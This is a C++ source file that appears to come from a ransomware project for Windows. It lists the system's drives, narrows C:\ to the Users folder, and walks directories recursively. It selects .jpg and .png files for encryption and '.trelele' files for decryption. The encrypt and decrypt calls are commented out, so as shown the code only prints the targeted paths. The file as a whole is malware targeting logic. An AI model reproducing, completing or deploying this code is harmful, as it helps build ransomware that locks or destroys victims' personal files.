
#include "../include/common.h"
#include "../include/search.h"
#include "../include/crypt.h"

void search::getDrive() {
		while (SystemDrive[0] == "") {
		if (strlen(driveBuffer) != 0) {
			for (int i = 0, j = 0, k = 0; i < 100; i++) {
				if (driveBuffer[i] != '\0') {
					SystemDrive[k] += driveBuffer[i];
					j++;
				}
				if (j == 3) {
					j = 0;
					k++;
				}
			}
		}
		else {
			DWORD driveStat = GetLogicalDriveStringsW(sizeof(driveBuffer), (LPWSTR)driveBuffer);
		}
	}
}
void search::isCSysDir() {
	for (int i = 0; i < 30; i++) {
		if (SystemDrive[i] == "C:\\") {
			SystemDrive[i] = "C:\\Users\\";
			break;
		}
	}
}
void search::searchInDir(std::filesystem::path& path, bool isEncrypt) {
	try {
		if (std::filesystem::exists(path) && std::filesystem::is_directory(path)) {
			std::error_code ec;
			std::filesystem::recursive_directory_iterator dir(path, std::filesystem::directory_options::skip_permission_denied, ec), end;

			while (dir != end) {
				if (std::filesystem::is_directory(dir->path()) && (std::find(dirSkipList.begin(), dirSkipList.end(), dir->path().filename()) != dirSkipList.end())) {
					dir.disable_recursion_pending();
				}
				else if (dir->path().has_extension() && (isEncrypt ? (dir->path().extension() == ".jpg" || dir->path().extension() == ".png") : (dir->path().extension() == ".trelele"))) {
					//targetFile.push_back(dir->path());
					std::cout << dir->path().string();
					//isEncrypt ? encrypt(dir->path()) : decrypt(dir->path());
				}
				dir++;
				if (ec) {
					std::cerr << "Error While Accessing : " << dir->path().string() << " :: " << ec.message() << '\n';
				}
			}
		}
	}
	catch (std::system_error& e) {
		std::cerr << "Exception :: " << e.what();
#ifndef NDEBUG
		std::cerr << "code :: " << e.code(); //code 32, file used/
		system("pause");
#endif // !NDEBUG
	}
}